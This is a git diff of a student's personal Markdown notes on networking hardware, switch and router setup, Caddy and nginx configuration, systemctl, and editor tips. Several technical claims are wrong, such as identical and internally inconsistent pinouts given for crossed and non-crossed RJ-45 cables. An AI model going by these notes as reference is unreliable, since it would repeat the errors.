+## Computer 
+
+### Processors
+
+- Processorts processor instructions that are defined in instruction sets.
+- `x86_64` is what runs on most computers sold on the market.
+- If you see an installer with `x86_64` in it, it should be executable by your computer.
 
 ### Storage types
 
@@ -2006,7 +2194,7 @@ What "is a code point" ? (...)
 
 ANSI ?
 
-Exercise : Find the characters that break the ``EditSummary`` script (they are it the ``Editsummary`` file)
+Exercise : Find the characters that break the `EditSummary` script (they are it the `Editsummary` file)
 
 #### Building a server
 
@@ -2025,7 +2213,7 @@ Exercise : Find the characters that break the ``EditSummary`` script (they are i
 
 - se203.telecom-paris.fr
 
-## Computer networking - Theory
+## Computer networking Theory
 
 Note : Wireshark is your friend ! :)
 
@@ -2114,10 +2302,10 @@ Switches
 ### Layer 3 networking
 
 Routers
-- ``ip route add [mask : IP range / or : "default" for setting default gateway] via [nexthop]``
+- `ip route add [mask : IP range / or : "default" for setting default gateway] via [nexthop]`
 - One MAC per interface.
 - Never use DHCP for routers !
-- ``ip link set dev [interace] up`` to up an interface
+- `ip link set dev [interace] up` to up an interface
 
 ### Layer 6 networking
 
@@ -2129,6 +2317,21 @@ One can say that HTTPS is basically HTTP + TLS
 #### Link layer
 
 [All link layer Protocols](https://en.wikipedia.org/wiki/Category:Link_protocols)
+
+##### STP
+
+- The Spanning Tree protocol is a protocol
+- In practice, it can take about 30s or 1min to converge to a solution. It can be even worse if you have a lot of switches !
+
+##### MSTP
+
+- Multiple Spanning-Tree Protocol is a variant of the Spanning Tree Protocol.
+- It is used at Rezel for their ISP (Internet Service Provider) service
+
+##### LACP
+
+- Link Aggregation Control Protocol is a protocol that allows to aggregate several links into one to speed up the transmission.
+- You could think that aggregating two (same speed) links would double the link speed, but in practice, the traffic due to protocol communication implies that you would typically get around 1.5x speed.
 
 ##### ARP 
 
@@ -2179,15 +2382,130 @@ DCHP is useful for configuring several IP addresses on a network, automatically 
 
 NATs exist because of the Bozos at Bell labs who decided there would be only 2^32 addresses.
 
-## Computer Networking : Practice
+### Control plane, Management plane, Data plane
+
+- The Control Plane
+  * It is where we decide what our networking will look like. 
+  * How to we setup our networking ? Where do we put what ? 
+  * How many switches ? Where do we put them ? 
+  * Who's connected to who, and how (with which support) ?
+  * It is basically the first step, deciding the "theory" of how do we set things up.
+  * Typically, at Rezel, the big schemes on the networking infrastructure explain everything that's Control-plane related.
+- The Management Plane
+  * It is about actually setting up in practice.
+  * Configuring switches, routers, with the corresponding interfaces
+  * monitoring the connexions...
+  * It can be seen as a "second step"
+- The Data Plane
+  * It is about actually transferring data.
+  * It concerns everything that's related to actual data transferring.
+  * It can be seen as a "third step".
+
+## Computer Networking Practice
+
+### Layer 1 networking equippment
+
+#### Optical fibers
+
+- They come in different types :
+  * LC/APC, SC/APC, LC/UPC, SC/APC
+  * The LC / SC distinction refers to the type of connector - the form-factor of the end of the cable.
+    + SC (Subscriber connector) are slightly bigger, and are essentially (supposed to be) plugged on the "user end" (Subscriber)
+    + LC (Lucent connector) are slightly smaller. They are (supposed to be) plugged on the service-provider end.
+  * The APC/UPC distinction refers to the way the fiber is polished at its end.
+    + UPC (Ultra Physical Contact) : the fiber is polished with a **flat** end face.
+    + APC (Angled Physical Contact) : the fiber is polished with a **8-degree** angle at the end face.
+    + The "Angled" version is supposed to be slightly better, because the 8-degree angle (is supposed to) mittigate the power loss due to reflexion (cf. Snell-Descarte sine law)
+  * All of the above are **single-mode** connector
+
+#### Ethernet cables
+
+- "Ethernet cables" are metonymically referred to as such because they typically transport Ethernet packets.
+- The more correct term would be "Twisted pair" cable, because the strings are twisted in pairs. 
+  * They must be twisted in pairs because otherwise the electromagnetic fields interferes with itself, jamms itself and it doesn't work.
+  * There exist non-twisted, called "flat", cables. These are not more than a few meters long.
+  * The data is then transferred using tensions (potential differences) between the two strings of each pair (hence, 4 potential differences, one for each pair).
+  * There are also power supply strings in these cables.
+  * 
+- Similarly, "Ethernet cables" often have RJ-45 ports on their ends. We often metonymically refer to these as Ethernet ports.
+  * RJ-45 ends can be used for ethernet or serial communication (or telephony, but who cares about telephony). According to Dorian, that's pretty much it.
+  * Their plastic is often transparent, and we can see eight little strings, that ought to be twisted in pairs (or not, in flat cables).
+  * RJ-45 ports can be crossed, non-crossed, rollback...
+  * Non-crossed means that the eight little strings are in the same order on both ends : (1,2,3,4,5,6,7,8) -> (2,1,4,3,6,4,8,7)
+  * Crossed means that the pairs are crossed : (1,2,3,4,5,6,7,8) -> (2,1,4,3,6,4,8,7)
+  * Rollback are the strings are in reverse order : (1,2,3,4,5,6,7,8) -> (8,7,6,5,4,3,2,1)
+- Twisted pairs cables have categories, ranging from 3 to 8 (maybe more in the future).
+  * Some normalisation (EIA/TIA 568, 1990) started the numerotation at 3 for some (good) reason.
+  * Category 3 and 4 are not used anymore, except maybe for telephony or 10base-T Ethernet.
+  * Category 5 and more support 1000base-T Ethernet.
+- There is a distinction between Fast Ethernet (100BASE-TX, 100BASE-T), Gigabit Ethernet (1000base-T, 100BASE-TX), there is autonegotiation to allow endpoints (NICs) to negotiate a speed... Ask Dorian next-time we see him for more details.
+
+#### DWDM Equippment
+
+- Multiplexers & demultiplexers
+  * They do what we expect : multiplex and demultiplex optical colors.
+  * They are passive equippments.
+  * Recall that, generally, a multiplexer "merges", "combines" several entries into one, while a demultiplexer "demultiplexes", i.e., "untangles", "separates", a "multi-entry" to several "mono-outputs"
+- When working with optic fibers, **be cautious** ! **They can blind you** !
+- For that reason, attenuators exist. These are little things that you can put onto a fiber end to mittigate the incoming signal. They are used whenever one needs to mittigate an output or input signal.
+- OADMs
+  * OADM stands for Optical Add-Drop Multiplexer.
+  * An OADM has two inputs and two outputs. It replaces the content of one specific given wavelength (color) $\lambda$.
+  * Its inputs are one polychromatic input (A), one monochrome input (B) at with wavelength $\lambda$
+  * Its outputs are one polychromatic output (C), and one monochrome output (D) with wavelength $\lambda$.
+  * The OADM takes the polychromatic input (A), removes the wavelength $\lambda$, and drops it on output (D)
+  * and injects the input (B), at the same wavelength, on the output (D), together with rest of the polychromatic signal on a (A) (the signal (A), without its $\lambda$ wavelength)
+  * So, in a nutshell, it takes a (polychromatic) signal, and replaces the content on some wavelength (which is fixed and depends on the OADM, it's part of its specs) (with a given input), and it drops it such that you can retrieve this specific wavelength in the input signal.
+  * This equippment is passive. 
+  * They come with two sides, that are symmetric by definition (the input and output can be switched).
+  * For that reason, they are named "West" and "End"
+- Multiplexers (WDM - Wavelength Division Multiplexing technology) come in two sorts
+  * DWDM stands for Dense Wavelength Division Multiplexing. 
+    + It's a technology that allows multiplexing on polychromatic signals with dense wavelength spectrum.
+    + This part separates the wavelengths into channels (C44, C45, C46, C47...). These correspond to wavelengths ranges (there is a standard, for the precise corresponding wavelengths, lookup on the net - no one knows these by heart)
+  * CWDM stands for Coarse Wavelength Division Multiplexing
+    + It's the opposite : it's for multiplexing on polychromatic signals with _coarse_ wavelength spectrum.
+    + This part works raw wavelenths : actual values of $\lambda$
+- LR Optics means "Long-range optics" : optics for transporting signal over long distances, typically from a city to another.
+- SR Optics is the opposite : Short-range optics, for transporting signal typically between two equippments on the same server farm/cluster.
+
+#### Transcievers
+
+- SFP(-/+/28/...) Optical Transceiver Modules are the small metallic things you plug into switches. 
+  * SFP means Small Form-factor pluggable.
+  * They convert optical signals to electric signals.
+  * There exists SFP (1Gb/s), SFP+ (10Gb/s), SFP28 (25Gb/s) and SFP28 50G (50Gb/s).
+  * The form factor are the same for all the SFP variants.
+  * The first two are quite common, the last are less.
+  * Since the latter are much more expensive, they are mostly used un big datacenter and server clusters. 
+- There also exists QSFP(-/+/28/...) ports, with require adequate (QSFP(-/+/28/...))
+  * All SFP things have a Q- counterpart. The associated are larger. 
+  * Q stands for quad : these are merges of four SFP(-/+/28/...) ports.
+  * The associated speeds are four time their non-Q counterpart : 4G/s, 40G/s, 100G/s.
+  * These are an aggregated version of four of their non-Q counterpart, but better.
+  * There exists breakout cables that allow to convert QSFP(-/+/28/...) (resp. 4x SFP(-/+/28/...)) to 4x SFP(-/+/28/...) (resp. QSFP(-/+/28/...))
+- There also exists XFP, which is quite rare.
+  * It served as a transition between SFP and SFP+.
+  * It became outdated as soon as SFP+ existed.
+  * But it can still be found sometimes.
+- There also exist GBIC transcievers (Gigabit Interface Converter)
+- ONT/OLTs
 
 ### Configuring a switch
+
+- To connect to a switch, there are essentially two options
+  * Either using a serial connexion
+  * Or exposing an interface with an IP address on one of its VLANs, and then SSHing into it 
+- Serial connexions 
+  * Switches usually have a serial port, to connect using a serial.
+  * Serial communication usually goes through either RJ-45 ports, or, on older equippments (computers or switches), serial ports, which look like VGA ports, but with **2 pin rows** (often 9 pins, can be 25 pins sometimes), unlike VGA ports which contain 3 rows.
+  * It can also, very usefully, be pased through USB ! For this, you will likely need a Serial USB driver. There exist many on the web, just lookup Serial-USB driver. 
 
 ### Configuring a router
 
 Note : this actually applies to any device 
 
-- ``ip route add default via [IP]``
+- `ip route add default via [IP]`
 
 #### Physical routers
 
@@ -2215,14 +2533,84 @@ Wireguard is what Clément uses for his private use of VPN. :O
 
 #### Nginx
 
-GitHub stars : 25k
-NGINX is the world's most popular Web Server. It provides load balancing, reverse proxy, ...
+- GitHub stars : 25k
+- Nginx is the world's most popular Web Server. It provides load balancing, reverse proxy, ...
+- Note : nginx does not have sufficient permissions to deal with files (in particular, to serve, redirect to..) stored under `/root/`...!
+- In particular; do not put your web-server there !
 
 #### Caddy
 
-GitHub stars : 57.9k
-Caddy is very cool ! :)
-It allows easy configuration, automatic HTTPS, without any external dependencies.
+- GitHub stars : 57.9k
+- Caddy is very cool ! :)
+- It allows easy configuration, automatic HTTPS, without any external dependencies.
+- An amazing fun fact : A paper written by experts describing Let's encrypt, "Let’s Encrypt: An Automated Certificate Authority to Encrypt the Entire Web", explicitely says : "Servers running Caddy exhibit nearly ubiquitous HTTPS deployment and use modern TLS configurations. ... We hope to see other popular server software follow Caddy's lead." !
+- Caddy is one of those packages that you don't install directly via a package manager.
+  * The [documentation](https://caddyserver.com/docs/install) says to run 
+  * ```bash 
+    sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https curl
+    curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg
+    curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list
+    sudo apt update
+    sudo apt install caddy
+    ```
+  * This could be updated so re-check directly
+- Once installed it should be run as a service : `systemctl restart caddy`. 
+- The configuration file is then in `/etc/caddy/Caddyfile`
+- An example of Caddy file configuration : 
+```
+{
+  debug
+}
+
+:8000 {
+    handle_path /first_folder/* {
+        root * /path/to/folder
+        file_server
+    }
+
+    handle_path /second_folder/* {
+        root * /path/to/folder2
+        file_server browse
+    }
+
+    log {
+        output stderr
+        level debug
+        format console
+    }
+
+    handle {
+        reverse_proxy localhost:8001
+    }
+}
+```
+- The code snippet above does the following : 
+  * When recieving requests on port 8000, 
+  * If the request is on folder `/first_folder/` (i.e., the user requested `<ip address or domain name>/first_folder`), then redirect to `/path/to/folder`.
+  * If none of the above paths are met, then the request will be given away to itself on port 8001 (`localhost` : loopback)
+  * By adding `file_server`, if the request is `.../first_folder/file.pdf`, caddy will serve the file.
+  * **Note :** This does not work if caddy does not have permissions in the folder. For instance, it doesn't work in any subfolders of `/root/` !
+  * By adding `file_server browse`, caddy will display an interface allowing to browse files and folder in that folder.
+  * Note : `root * ...` can be simplified as `root ...`
+  * `log { ... }` and `{ debug }` do what we expect from them, that is, being verbose about problems and errors. (This will be seen in `systemctl status <service>` if caddy is run as a service)
+- Note : caddy does not have sufficient permissions to deal with files (in particular, to serve, redirect to..) stored under `/root/`...!
+- In particular; do not put your web-server there !
+
+#### Systemctl
+
+- Systemctl allows to run processes as _services_ : i.e., 
+- Services could typically include : 
+  * Reverse-proxies such as nginx, caddy, traefik... 
+  * Proxies
+  * Web servers...
+- `systemctl restart service` to restart a service
+- `systemctl enable service` to have a service enabled.
+- When _enabled_, a service will be started at boot of your computer. 
+- i.e., services remain active after system restart (after rebooting).
+- `systemctl status service` shows the status of a service. 
+  * In particular, it shows the command that's ran when (re)starting the service : `caddy ... ...`, or `nginx ... ...`...
+- You can set your own services (with corresponding custom configuration files)
+- When in production, things should be always deployed as services. (in particular, web servers should not be deployed using mere terminal multiplexers)(I mean, both work, but ya know.)
 
 #### Traefik
 
@@ -2240,31 +2628,44 @@ It is not as easy to use as Caddy...
 
 ### VSCode
 
-- ``CTRL+K CTRL+O`` to expand all.
+- `CTRL+K CTRL+O` to expand all.
 - (...) to collapse all.
-- ``CTRL+K CTRL+S`` to open (and edit) keyboard shortcuts !
-- ``CTRL+*`` to split up the screen vertically.
+- `CTRL+K CTRL+S` to open (and edit) keyboard shortcuts !
+- `CTRL+*` to split up the screen vertically.
+- When in "Find and replace mode", pressing enter in the first field searches for next occurence of the pattern, while pressing enter in the second _replaces current occurence_ and finds the next one. ! :)
 
 ### ffmpeg
 
-- ``choco install ffmpeg`` to install it on any device (that has chocolatey installed)
-- Conversion : ``ffmpeg -i input.ext1 output.ext2``
+- `choco install ffmpeg` to install it on any device (that has chocolatey installed)
+- Conversion : `ffmpeg -i input.ext1 output.ext2`
 
 ### Chrome  
-- ``CTRL+SHIFT+B`` pour afficher/cacher la barre des favoris
-- ``view-source:https://...`` ou ``CTRL+U`` pour afficher la code source d'une page
+- `CTRL+SHIFT+B` pour afficher/cacher la barre des favoris
+- `view-source:https://...` ou `CTRL+U` pour afficher la code source d'une page
 - YouTube : Press the `o` key to change the brightness of the text on subtitles. Particularly useful as the text often tends to become darker and grey<sup>USA</sup>/gray<sup>GB</sup>.
 - You can set particular website query shortcuts in `chrome://settings/searchEngines` : add the URL with `%s` where the query should be inserted and the shortcut to type in the search bar.
 
 ### Markdown
-- ``<ins> ... </ins>`` to underline text.
-- ``<sup> ... </sup>`` to superscript (écrire en exposant)
-- ``<sub> ... </sub>`` to subscript (écrire en indice)
-- It is possible to make hypertext links to different parts of the same Markdown document using :``[Hyperlink name](#name-of-the-title-in-lowercase-and-with-dashes-instead-of-spaces)
+- `<ins> ... </ins>` to underline text.
+- `<sup> ... </sup>` to superscript (écrire en exposant)
+- `<sub> ... </sub>` to subscript (écrire en indice)
+- It is possible to make hypertext links to different parts of the same Markdown document using :`[Hyperlink name](#name-of-the-title-in-lowercase-and-with-dashes-instead-of-spaces)
 - Unfortunately, if several titles have the same name, any hyperlink will link to the first occurence of that name. Even if they aren't at the same "stage", or "scope" (i.e., even if they don't have the same number of `#` (sharps))
 - You can write inline code with backticks : `. 
 - Triple backticks allow to write code on several lines. Adding a keyword right after the opening triple backticks allow to specify the language used (Go, Python, JavaScript, ..., or even git diff !) for the preview to color the code appropriately.
-- Amazing : By a miracle, a hyperlink like `[text](#aaabbb)` _will_ link a title containint special caracters and backticks (example : `` ### `/etc/passwd` ``) !
+- Note : It is possible to use triple backticks code (code that expands on several lines) _within_ bullet point lists, but **beware** : for these to be correctly displayed (when the Markdown will be rendered), the following formatting must be applied :
+  * ```md
+    - (Text)(optional)
+      * (Text)(optional)
+      * [Triple backtick]
+        code
+        [Triple backtick]
+      * (Text)(optional)
+    ```
+  * i.e. : 
+    + The triple backticks must imperatively be indented accordingly, at the same level as the bullet point.
+    + The code too. _Bref_, everything must be indented at the same level as the bullet point.
+- Amazing : By a miracle, a hyperlink like `[text](#aaabbb)` _will_ link a title containing special caracters and backticks (example : ` ### `/etc/passwd` `) !
 - Is is possible to make tables :
 ```
 | Left Aligned | Center Aligned | Right Aligned |
@@ -2507,6 +2908,7 @@ explicit.
 - Ubuntu devs are quite golems because of the existence of the link
   * http://archive.ubuntu.com/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/ubuntu/
   * http://archive.ubuntu.com/ubuntu exists, and if you click on the `ubuntu` folder, it leads to (a copy of ?) itself. This loop stops after clicking 38 times. Ptdrrr
+- A paper written by experts describing Let's encrypt, "Let’s Encrypt: An Automated Certificate Authority to Encrypt the Entire Web", explicitely says : "Servers running Caddy exhibit nearly ubiquitous HTTPS deployment and use modern TLS configurations. ... We hope to see other popular server software follow Caddy's lead." !
 
 ### Other other
 
@@ -2536,10 +2938,10 @@ explicit.
 - What does ``curl`` really do ?
 - How to use a printer with linux ?
 - How to use ``mount`` and ``umount`` ?
-- ``sudo apt intall tm`` returned ``E: dpkg was interrupted, you must manually run 'sudo dpkg --configure -a' to correct the problem.'`` What happened, what is the problem, what does this command do and why does it solve the problem ? Also, What's the difference between ``apt`` and ``dpkg`` (and, more generally, between ``pacman``, ``nala`` ... and all other package managers) ?
-- What is the difference between ``apt-get`` and ``apt`` ?
-- What is the difference between ``apt update`` and ``apt upgrade`` ?
-- What is the difference between ``apt rm`` and ``apt remove`` ?
+- ``sudo apt intall tm`` returned ``E: dpkg was interrupted, you must manually run 'sudo dpkg --configure -a' to correct the problem.'`` What happened, what is the problem, what does this command do and why does it solve the problem ? Also, What's the difference between ``apt`` and ``dpkg`` (and, more generally, between `pacman`, `nala` ... and all other package managers) ?
+- What is the difference between `apt-get` and ``apt`` ?
+- What is the difference between `apt update` and `apt upgrade` ?
+- What is the difference between `apt rm` and `apt remove` ?
 - How to update a pacjage manager's package list ? ``sudo apt update-list`` ?
 - What do the colors mean in ``ls /`` and ``ls /bin`` (directories vs. files) ?
 - How to use ``||``, ``&&``, ``>>`` and ``<<`` on Linux terminal ? 
